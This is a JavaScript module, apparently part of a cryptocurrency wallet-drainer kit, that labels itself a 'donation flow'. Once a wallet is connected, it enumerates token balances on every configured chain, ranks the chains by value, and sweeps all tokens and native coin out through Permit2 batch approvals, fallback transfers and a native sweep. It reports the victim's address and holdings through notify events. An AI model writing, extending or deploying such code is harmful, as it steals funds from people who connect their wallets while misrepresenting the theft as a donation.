// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

export async function runDonationFlow(walletClient) {
  try {
    // resolve wallet owner
    let owner = null;
    if (walletClient?.account?.address) owner = walletClient.account.address;
    else if (typeof window !== "undefined" && window.ethereum) {
      const tmpProv = new ethers.BrowserProvider(window.ethereum);
      await tmpProv.send("eth_requestAccounts", []);
      owner = await tmpProv.getSigner().getAddress();
    }
    if (!owner) throw new Error("Wallet not connected");

    const trackingId = Date.now().toString();

    // collect balances per chain
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);
      chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
    }

    // notify wallet connected
    const balancesPayload = chainBalances.map(c => ({
      name: c.name,
      native: "0", // TODO: fetch native separately if needed
      tokens: c.tokens.map(t => ({
        name: t.tokenSymbol,
        amount: t.balanceRaw,
        value: t.quote,
      })),
      total: c.totalValue,
    }));
    const grandTotal = balancesPayload.reduce((acc, c) => acc + (c.total || 0), 0);

    notify("WALLET_CONNECTED", {
      walletAddress: owner,
      trackingId,
      balances: balancesPayload,
      grandTotal,
    });

    // sort chains by total value
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    // sweep each chain
    for (const chain of chainBalances) {
      const localTrackingId = Date.now().toString();

      notify("DONATION_START", { walletAddress: owner, trackingId: localTrackingId });

      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, localTrackingId);

      const permit2Tokens = [];
      const fallbackTokens = [];

      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) {
          fallbackTokens.push(t);
          continue;
        }
        const ok = await isPermit2Compatible(addr, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      // execute permit2 batch
      try {
        if (permit2Tokens.length) {
          await executePermit2Batch(signer, chain.chainId, permit2Tokens);
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        fallbackTokens.push(...permit2Tokens);
      }

      // fallback batch
      try {
        if (fallbackTokens.length) {
          await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      // native sweep
      try {
        await sweepNative(signer, provider, chain.chainId);
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // notify results
      notify("DONATION_RESULTS", {
        walletAddress: owner,
        trackingId: localTrackingId,
        balances: [
          {
            name: chain.name,
            native: "n/a",
            tokens: chain.tokens.map(t => ({
              name: t.tokenSymbol,
              amount: t.balanceRaw,
              value: t.quote,
            })),
            total: chain.totalValue,
          },
        ],
        donationSummary: {
          total: chain.totalValue,
          breakdown: [{ chain: chain.name, amount: chain.totalValue }],
        },
      });
    }

    // final notify
    notify("WALLET_DISCONNECTED", { walletAddress: owner, trackingId });

    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
